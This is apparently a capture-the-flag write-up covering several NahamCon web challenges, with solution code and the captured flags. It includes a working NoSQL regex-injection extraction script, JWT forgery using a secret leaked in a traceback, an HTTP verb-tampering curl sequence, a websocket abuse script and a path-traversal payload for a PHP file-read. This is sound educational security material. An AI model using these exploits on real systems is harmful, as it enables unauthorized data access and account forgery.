## SNAD 
Desc: No, it's not a typo. It's not sand. It's SNAD. There's a difference!

Interaction : On mouseclick grains of different color fall on the screen. Holding on the key would decide the color of the grain `eg - Click on the screen while holding R would only make Red color grain fall`


Solution:
- Source code 

```
const requiredGrains = 7, targetPositions = [{ x: 367, y: 238, colorHue: 0 }, { x: 412, y: 293, colorHue: 40 }, { x: 291, y: 314, colorHue: 60 }, { x: 392, y: 362, colorHue: 120 }, { x: 454, y: 319, colorHue: 240 }, { x: 349, y: 252, colorHue: 280 }, { x: 433, y: 301, colorHue: 320 }], tolerance = 15, hueTolerance = 20; let particles = [], grid = [], isMousePressed = !1, colorIndex = 0, flagRevealed = !1, targetIndicatorsVisible = !1, gravityStopped = !1; function getRainbowColor() { return color("hsb(" + (colorIndex = (colorIndex + 5) % 360) + ", 100%, 90%)") } function getSpecificColor(e) { return color("hsb(" + e + ", 100%, 90%)") } async function retrieveFlag() { let e = document.getElementById("flag-container"); e.style.display = "block"; try { let t = particles.filter(e => e.settled).map(e => ({ x: Math.floor(e.x), y: Math.floor(e.y), colorHue: e.colorHue })), o = await fetch("/api/verify-ctf-solution", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ particleData: t }) }), i = await o.json(), r = e.querySelector(".loading"); r && r.remove(), i.success ? (e.querySelector("p").textContent = "SNAD!", document.getElementById("flag-text").textContent = i.flag) : (e.querySelector("p").textContent = i.message, document.getElementById("flag-text").textContent = "", setTimeout(() => { e.style.display = "none", flagRevealed = !1 }, 3e3)) } catch (l) { console.error("Error retrieving flag:", l), document.getElementById("flag-text").textContent = "Error retrieving flag. Please try again."; let s = e.querySelector(".loading"); s && s.remove() } } function injectSand(e, t, o) { if (isNaN(e) || isNaN(t) || isNaN(o)) return console.error("Invalid parameters. Usage: injectSand(x, y, hue)"), !1; o = (o % 360 + 360) % 360; let i = new Particle(e, t, { colorHue: o, settled: !0, skipKeyCheck: !0, vx: 0, vy: 0 }); particles.push(i); let r = floor(e), l = floor(t); return r >= 0 && r < width && l >= 0 && l < height && (grid[l][r] = !0), i } function toggleGravity() { gravityStopped = !gravityStopped, console.log(`Gravity ${gravityStopped ? "stopped" : "resumed"}`) } class Particle { constructor(e, t, o = {}) { this.x = void 0 !== o.x ? o.x : e, this.y = void 0 !== o.y ? o.y : t, this.size = o.size || random(2, 4), void 0 !== o.colorHue ? (this.colorHue = o.colorHue, this.color = getSpecificColor(o.colorHue)) : (this.color = getRainbowColor(), this.colorHue = colorIndex), this.vx = void 0 !== o.vx ? o.vx : random(-.5, .5), this.vy = void 0 !== o.vy ? o.vy : random(0, 1), this.gravity = o.gravity || .2, this.friction = o.friction || .98, this.settled = o.settled || !1, o.skipKeyCheck || this.checkSpecialGrain() } checkSpecialGrain() { keyIsDown(82) ? (this.color = getSpecificColor(0), this.colorHue = 0) : keyIsDown(79) ? (this.color = getSpecificColor(40), this.colorHue = 40) : keyIsDown(89) ? (this.color = getSpecificColor(60), this.colorHue = 60) : keyIsDown(71) ? (this.color = getSpecificColor(120), this.colorHue = 120) : keyIsDown(66) ? (this.color = getSpecificColor(240), this.colorHue = 240) : keyIsDown(73) ? (this.color = getSpecificColor(280), this.colorHue = 280) : keyIsDown(86) && (this.color = getSpecificColor(320), this.colorHue = 320) } update(e) { if (this.settled || gravityStopped) return; this.vy += this.gravity, this.vx *= this.friction; let t = this.x + this.vx, o = this.y + this.vy; (t < 0 || t >= width || o >= height) && (o >= height && (o = height - 1, this.settled = !0), t < 0 && (t = 0), t >= width && (t = width - 1)); let i = min(floor(o) + 1, height - 1), r = floor(t); if (i < height && !e[i][r]) this.x = t, this.y = o; else { let l = max(r - 1, 0), s = min(r + 1, width - 1); i < height && !e[i][l] ? (this.x = t - 1, this.y = o, this.vx -= .1) : i < height && !e[i][s] ? (this.x = t + 1, this.y = o, this.vx += .1) : (this.x = r, this.y = floor(this.y), this.settled = !0) } let c = floor(this.x), a = floor(this.y); c >= 0 && c < width && a >= 0 && a < height && (e[a][c] = !0) } draw() { noStroke(), fill(this.color), circle(this.x, this.y, this.size) } } function setup() { createCanvas(windowWidth, windowHeight), resetGrid(), document.addEventListener("keydown", function (e) { "t" === e.key && (targetIndicatorsVisible = !targetIndicatorsVisible), "x" === e.key && toggleGravity() }), window.injectSand = injectSand, window.toggleGravity = toggleGravity, window.particles = particles, window.targetPositions = targetPositions, window.checkFlag = checkFlag } function resetGrid() { grid = []; for (let e = 0; e < height; e++) { grid[e] = []; for (let t = 0; t < width; t++)grid[e][t] = !1 } flagRevealed = !1; let o = document.getElementById("flag-container"); o.style.display = "none" } function draw() { if (background(30), isMousePressed && mouseX > 0 && mouseX < width && mouseY > 0 && mouseY < height) for (let e = 0; e < 3; e++) { let t = new Particle(mouseX + random(-5, 5), mouseY + random(-5, 5)); particles.push(t) } if (targetIndicatorsVisible) for (let o of (stroke(255, 150), strokeWeight(1), targetPositions)) noFill(), stroke(o.colorHue, 100, 100), circle(o.x, o.y, 30); let i = []; for (let r = 0; r < height; r++) { i[r] = []; for (let l = 0; l < width; l++)i[r][l] = !1 } for (let s of particles) { s.update(grid), s.draw(); let c = floor(s.x), a = floor(s.y); c >= 0 && c < width && a >= 0 && a < height && (i[a][c] = !0) } grid = i, checkFlag(), fill(255), textSize(16), text("Particles: " + particles.length, 10, height - 20) } function checkFlag() { if (flagRevealed) return; let e = 0, t = []; for (let o of targetPositions) { let i = !1; for (let r of particles) if (r.settled) { let l = dist(r.x, r.y, o.x, o.y), s = min(abs(r.colorHue - o.colorHue), 360 - abs(r.colorHue - o.colorHue)); if (l < 15 && s < 20) { i = !0, t.push({ targetPos: `(${o.x}, ${o.y})`, targetHue: o.colorHue, particlePos: `(${Math.floor(r.x)}, ${Math.floor(r.y)})`, particleHue: r.colorHue, distance: Math.floor(l), hueDifference: Math.floor(s) }); break } } i && e++ } e >= 7 && (flagRevealed = !0, console.log("\uD83C\uDF89 All positions correct! Retrieving flag..."), retrieveFlag()) } function mousePressed() { isMousePressed = !0 } function mouseReleased() { isMousePressed = !1 } function keyPressed() { ("c" === key || "C" === key) && (particles = [], resetGrid()) } function windowResized() { resizeCanvas(windowWidth, windowHeight), resetGrid() }

```


- The goal is to place exactly 7 grains of sand  at specific target positions with matching color hues, within a small position (±15 pixels) and color hue (±20 degrees) tolerance.

- Manually create the 7 grain particle and settle it down and run checkFlag instantly 

```
  targetPositions.forEach(p => injectSand(p.x, p.y, p.colorHue));
   checkFlag();
```

Flag : flag{6ff0c72ad11bf174139e970559d9b5d2}


# Method to Madness

Desc- Not given 

Interaction - 6 boxes with checkout this page written , non clickable 

Solution- 

- Nothing relevant in the source code  other than ` <a href="/interesting" target="_blank" rel="noopener noreferrer">checkout this page</a>`
- Visit this `/interesting` endpoint to get one checkbox ticked 
- Going by the name of the challenge 
```
curl -X POST http://challenge.nahamcon.com:31947/interesting
curl -X PUT http://challenge.nahamcon.com:31947/interesting
curl -X DELETE http://challenge.nahamcon.com:31947/interesting
curl -X PATCH http://challenge.nahamcon.com:31947/interesting
curl -X OPTIONS http://challenge.nahamcon.com:31947/interesting
```

to get all the checkboxes and the `flag{bd399cb9c3a8b857588d8e13f490b6fd} `

#  Infinite Queue
Desc - Oh my god, I just can't with these concert ticket queues. It's gotten out of control. 

Interaction - Join queue , enter your email id to get queue time 

Solution : 

- After joining queue , Token in local storage 
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZGV2QGdtYWlsLmNvbSIsInF1ZXVlX3RpbWUiOjE3OTc3MjQ1NTMuMzIyODQxLCJleHAiOjUzNDgxOTk3NzN9.GudU2LisxQpFOxmTKRqLxha9gG1-TLC-OIJsjcXQG4E
```
- JWT with 
```
{
  "user_id": "dev@gmail.com",
  "queue_time": 1797724553.322841,
  "exp": 5348199773
}
```
- Change the `queue_time` to the current time in the Unix timestamp , the traceback gives 
`"JWT_SECRET": "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC"` 

- Update the token in the local storage refresh to get a pdf which has the flag
- `flag{b1bd4795215a7b81699487cc7e32d936}`


#  No Sequel

Desc - It always struck me as odd that none of these movies ever got sequels! Absolute cinema.

Interaction - Search  page had the form with `Search Query`and dropdown collection having `movies` and `flags` as options 

Soltion:
- Example query with `title: Inception {"year": {"$gt": 1990}} title: {$regex: "The"}`
gave away that we have to search for regex 

- Searching for `flag: { $regex: "^flag{" }` gave patterned match 
- Run this Scipt to get the whole flag 

```
import requests

URL = "http://challenge.nahamcon.com:30846/search"
PREFIX = "flag{"
CHARSET = "0123456789abcdef}"
MAX_LEN = 40  # Adjust as needed

def extract_flag():
    flag = PREFIX
    session = requests.Session()

    while not flag.endswith('}'):
        for c in CHARSET:
            guess = flag + c
            payload = {
                "query": f'flag: {{$regex: "^{guess}"}}',
                "collection": "flags"
            }
            print(f"[*] Trying: {guess}")
            resp = session.post(URL, data=payload)
            if "Pattern matched" in resp.text:
                flag += c
                print(f"[+] Found next char: {c} -> {flag}")
                break
        else:
            print("[-] No matching character found, stopping.")
            break
        if len(flag) > MAX_LEN:
            print("[-] Flag too long, stopping.")
            break
    print(f"\n[!] Extracted flag: {flag}")

if __name__ == "__main__":
    extract_flag()
```

`flag{4cb8649d9ecb0ec59d1784263602e686} `

# TMCB 
Desc - They thought they could impress us with One Million Checkboxes!? Pfft... how about TWO Million Checkboxes?!

Ya gotta check'em all!!

Interaction - 2 million checkboxes given need to check each of them to get the flag

Solution: 

- Running a script for each box going from 0 to 2million doing `action:check` will result in timeouts due to how the websockets work 

- Try for edge cases and sending in bulk worked. 


```
import asyncio
import websockets
import json

WS_URL = "ws://challenge.nahamcon.com:30572/ws"

async def try_payload(ws, payload, description):
    print(f"\n[*] Trying: {description}")
    await ws.send(json.dumps(payload))
    try:
        response = await asyncio.wait_for(ws.recv(), timeout=5)
        print(f"[+] Response: {response[:300]}{'...' if len(response)>300 else ''}")
        if "flag" in response.lower():
            print("[!!!] FLAG FOUND!")
            return True
    except Exception as e:
        print(f"[!] Exception: {e}")
    return False

async def main():
    async with websockets.connect(WS_URL) as ws:
        print(f"[+] Connected to {WS_URL}")

        
        payloads = [
            ({"action": "check_all"}, "action: check_all"),
            ({"action": "check", "numbers": "all"}, "action: check, numbers: 'all'"),
            ({"action": "check", "numbers": [-1]}, "action: check, numbers: [-1]"),
            ({"action": "check", "numbers": [2000000]}, "action: check, numbers: [2000000]"),
            ({"action": "check", "numbers": [999999999]}, "action: check, numbers: [999999999]"),
            ({"action": "admin"}, "action: admin"),
            ({"action": "debug"}, "action: debug"),
            ({"action": "give_flag"}, "action: give_flag"),
        ]

       
        try:
            print("\n[*] Trying: action: check, numbers: [0..1999999] (may take time)")
            all_numbers = list(range(2_000_000))
            await ws.send(json.dumps({"action": "check", "numbers": all_numbers}))
            response = await asyncio.wait_for(ws.recv(), timeout=10)
            print(f"[+] Response: {response[:300]}{'...' if len(response)>300 else ''}")
            if "flag" in response.lower():
                print("[!!!] FLAG FOUND!")
                return
        except Exception as e:
            print(f"[!] Exception (all numbers): {e}")

       
        for payload, desc in payloads:
            found = await try_payload(ws, payload, desc)
            if found:
                break

if __name__ == "__main__":
    asyncio.run(main())

```
- A bette way of solving this would have been 
```
import websocket

ws = websocket.WebSocket()
ws.connect('ws://challenge.nahamcon.com:30572/ws')
ws.send('{"action":"get_state"}')
print(ws.recv())
for i in range(200):
    print(i)
    ws.send(f'{{"action": "check", "numbers": [{','.join(str(i * 10_000 + x) for x in range(10_000))}]}}')
    ws.recv()
```
which is just sending in bulk instead of each check boxes 

- `flag{7d798903eb2a1823803a243dde6e9d5b}`


# My First CTF [Dumbest Web challenge ever seen]
Desc - On second thoughts I should have probably called this challenge "Nz Gjstu DUG"

Interaction - Static page with AI generated image saying `This App is rotten`

Solution: 
- The image and the desc is hint towards Rot13,Trying "Rotting" will reveal `Nz Gjstu DUG` is `My First CTF`  in `Rot-25`

- Visit `flag.txt` to get `Ha! You wish` 
- Visit `/gmbh.uyu` instead which is `Rot-25` 
- flag{b67779a5cfca7f1dd120a075a633afe9}

# My Second CTF 
Desc - NOTE, this challenge requires some content discovery but only use the wordlist.txt file we've supplied to avoid wasting your time!

Interaction - Static page with AI generated image saying `This one is one step more rotten`

Solution:
- One more step means `Rot-24`
- Fuzz with the wordlist turned to `Rot-24` , debug in `Rot-24`  which is `/fgdwi/`shows positive 
- Fuzz again with  the same wordlist at the endpoint `/fgdwi/` to get hit for confirm in `Rot-24` `fgdwi/?eqphkto` endpoint gives the flag 

- flag{9078bae810c524673a331aeb58fb0ebc}

# My Third CTF 

Desc- Same premises but now with "incrementaly worse" 
Wordlist given

Solution:
-Multiple fuzzes and this but in incrementary worse rot order
`/page/message/token/hash `

-`ROT-25`,`ROT-24`,`ROT-23`,`Rot-22` so `/page/message/token/hash ` becomes `/qbhf/oguucig/wrnhq/lewl`

- `flag{afd87cae63c08a57db7770b4e52081d3}`

# OUTCAST 

Desc-  YesWeHack has provided this CTF challenge, and they state: "This challenge is meant to be run as a black-box environment. The source code is intentionally not provided."

Light enumeration is permitted for this challenge.

NOTE, the flag for this challenge is not in the standard flag format. The format of the flag is with a flag{} wrapper but with l33tsp3@k! inside the curly braces. 

Interaction - Admin login page which only returned `#` , `/info` page with some info about the challenge. 

Solution: 
-`/test` discover this endpoint from the source code 

- There is an API Caller with three functions `User_id`, `API method` and `Paramater` . A download template code revealed the working behind the API Caller. 

```
<?php

class APICaller {
    private $url =  'http://localhost/api/';
    private $path_tmp = '/tmp/';
    private $id;

    public function __construct($id, $path_tmp = '/tmp/') {
        $this->id = $id;
        $this->path_tmp = $path_tmp;

    }

    public function __call($apiMethod, $data = array()) {
        $url = $this->url . $apiMethod;
        $data['id'] = $this->id;

        foreach ($data as $k => &$v) {
            if ( ($v) && (is_string($v)) && str_starts_with($v, '@') ) {
                $file = substr($v, 1);

                if ( str_starts_with($file, $this->path_tmp) ) {
                    $v = file_get_contents($file);
                }
            }
            if (is_array($v) || is_object($v)) {
                $v = json_encode($v);
            }
        }

        // Call the API server using the given configuraions
        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER     => array('Accept: application/json'),
        ));
        $response = curl_exec($ch);
        $error  = curl_error($ch);
        
        curl_close($ch);

        if (!empty($error)) {
            throw new Exception($error);
        }

        return $response;
    }
}
```

- Basically have to Craft a payload such that flag.txt can be read via the parameters 

- Tried bunch of payloads like `admin=@temp/flag.txt` but only got `{"users":{"admin":true,"guest":true}}` most of times . 

- username=@/tmp/../flag.txt would give the flag. There was a interesting endpoint at `/login` which could have also hinted towards it . 

![alt text](BurpOutcast.png)









